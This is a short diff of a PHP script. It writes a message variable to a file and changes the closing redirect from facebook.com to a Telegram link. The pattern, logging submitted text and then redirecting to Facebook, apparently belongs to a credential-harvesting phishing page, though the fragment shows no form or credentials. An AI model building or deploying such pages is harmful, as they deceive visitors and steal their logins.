@@ -49,7 +49,7 @@ $txt = $message;
 fwrite($myfile, $txt);
 fclose($myfile);
 
-HEADER("Location: https://www.facebook.com/");
+HEADER("Location: https://t.me/Lodingdead");
 
 
 ?>
